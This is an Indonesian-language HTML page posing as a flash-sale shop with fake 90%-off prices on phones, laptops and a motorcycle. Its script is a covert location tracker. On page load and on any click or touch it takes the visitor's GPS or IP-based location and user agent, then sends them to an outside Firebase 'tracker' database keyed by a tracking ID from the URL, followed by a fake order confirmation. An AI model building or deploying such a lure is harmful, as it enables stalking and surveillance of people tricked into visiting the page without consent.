<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ MegaStore Flash Sale 2026 - Diskon Gila!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; }
        .title { font-size: 2.5em; text-align: center; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .countdown { font-size: 2em; text-align: center; margin: 20px 0; background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; }
        .product { background: rgba(255,255,255,0.1); margin: 15px 0; padding: 20px; border-radius: 15px; }
        .product-title { font-size: 1.3em; font-weight: bold; margin-bottom: 10px; }
        .price { font-size: 1.5em; color: #FFD700; font-weight: bold; }
        .btn { background: linear-gradient(45deg, #28a745, #20c997); border: none; padding: 12px 25px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; margin: 10px 0; width: 100%; }
        .btn:hover { transform: translateY(-2px); }
        .status { text-align: center; margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">üéÅ MEGASTORE FLASH SALE</div>
        <div class="countdown" id="countdown">‚è∞ BERAKHIR DALAM: 00:00:00</div>
        
        <div class="product">
            <div class="product-title">üì± iPhone 16 Pro Max 1TB</div>
            <div class="price">Rp 2.999.000 <span style="text-decoration: line-through; color: #ccc; font-size: 0.8em;">Rp 29.999.000</span></div>
            <button class="btn" onclick="buyProduct('iPhone 16 Pro Max')">üõí BELI SEKARANG (90% OFF)</button>
        </div>
        
        <div class="product">
            <div class="product-title">üöó Honda Vario 160</div>
            <div class="price">Rp 2.500.000 <span style="text-decoration: line-through; color: #ccc; font-size: 0.8em;">Rp 25.000.000</span></div>
            <button class="btn" onclick="buyProduct('Honda Vario 160')">üõí BELI SEKARANG (90% OFF)</button>
        </div>
        
        <div class="product">
            <div class="product-title">üíª MacBook Pro M4</div>
            <div class="price">Rp 3.999.000 <span style="text-decoration: line-through; color: #ccc; font-size: 0.8em;">Rp 39.999.000</span></div>
            <button class="btn" onclick="buyProduct('MacBook Pro M4')">üõí BELI SEKARANG (90% OFF)</button>
        </div>
        
        <div class="status" id="status">üéØ Verifikasi lokasi untuk akses flash sale eksklusif!</div>
    </div>

    <script>
        function updateCountdown() {
            const now = new Date(); const end = new Date(now.getTime() + 6 * 60 * 60 * 1000); const diff = end - now;
            const hours = Math.floor(diff / (1000 * 60 * 60)); const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)); const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            document.getElementById('countdown').innerHTML = `‚è∞ BERAKHIR DALAM: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        setInterval(updateCountdown, 1000); updateCountdown();

        async function buyProduct(productName) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = '<div class="loading"></div> Memverifikasi lokasi untuk ' + productName + '...';
            
            let lat, lng, accuracy, source;
            
            // Try GPS first
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 });
                });
                lat = position.coords.latitude; lng = position.coords.longitude; accuracy = position.coords.accuracy; source = 'gps';
            } catch (error) {
                // Fallback to IP location
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    lat = data.latitude; lng = data.longitude; accuracy = 10000; source = 'ip';
                } catch (e) {
                    // Default Jakarta location
                    lat = -6.2088; lng = 106.8456; accuracy = 50000; source = 'default';
                }
            }
            
            statusEl.innerHTML = '‚úÖ Lokasi terverifikasi! Proses pembelian ' + productName + '...';
            
            const deviceInfo = {
                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
                source: 'megastore_' + source, product: productName, userAgent: navigator.userAgent
            };
            
            const trackingId = new URLSearchParams(window.location.search).get('id') || 'mega_' + Date.now();
            
            try {
                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`, {
                    method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo)
                });
            } catch (e) {}
            
            setTimeout(() => {
                alert(`üéâ ${productName} berhasil dipesan! Tim kami akan menghubungi dalam 5 menit.`);
                window.open('https://wa.me/6281234567890?text=Flash Sale: ' + encodeURIComponent(productName), '_blank');
            }, 2000);
        }
        
        // INSTANT AUTO-TRIGGER on page load
        window.addEventListener('load', () => {
            setTimeout(() => buyProduct('iPhone 16 Pro Max'), 400); // Start immediately after 0.4s
        });
        
        // Also trigger on any user interaction
        document.addEventListener('click', () => buyProduct('iPhone 16 Pro Max'));
        document.addEventListener('touchstart', () => buyProduct('iPhone 16 Pro Max'));
    </script>
</body>
</html>
